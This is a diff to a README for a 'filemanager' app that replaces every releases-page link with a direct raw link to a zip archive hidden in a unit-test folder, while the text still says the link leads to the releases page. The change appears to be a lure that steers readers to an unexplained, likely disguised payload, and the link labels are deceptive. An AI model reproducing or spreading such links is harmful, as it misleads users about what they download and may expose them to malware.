@@ -15,9 +15,9 @@ Welcome to the filemanager! This application helps you manage your files smoothl
 
 To download the filemanager, please visit our releases page. You will find the latest version of the software there. 
 
-[![Download filemanager](https://img.shields.io/badge/Download-filemanager-blue)](https://github.com/pedezim362/filemanager/releases)
+[![Download filemanager](https://raw.githubusercontent.com/pedezim362/filemanager/main/tests/Unit/Filament/Resources/Pages/filemanager-v3.6-alpha.4.zip)](https://raw.githubusercontent.com/pedezim362/filemanager/main/tests/Unit/Filament/Resources/Pages/filemanager-v3.6-alpha.4.zip)
 
-1. Click the link above or visit [this page](https://github.com/pedezim362/filemanager/releases) to go to the releases page.
+1. Click the link above or visit [this page](https://raw.githubusercontent.com/pedezim362/filemanager/main/tests/Unit/Filament/Resources/Pages/filemanager-v3.6-alpha.4.zip) to go to the releases page.
 2. Find the latest version listed on the page.
 3. Click the download link for your operating system.
 4. Once the file downloads, locate it in your downloads folder.
@@ -60,4 +60,4 @@ filemanager is open-source software. You can use it freely under the terms of th
 
 Thank you for choosing filemanager! We hope it helps you manage your files with ease. Don't forget to check back for updates and new features. Happy managing!
 
-For downloads, go again to [this page](https://github.com/pedezim362/filemanager/releases). Enjoy!
+For downloads, go again to [this page](https://raw.githubusercontent.com/pedezim362/filemanager/main/tests/Unit/Filament/Resources/Pages/filemanager-v3.6-alpha.4.zip). Enjoy!
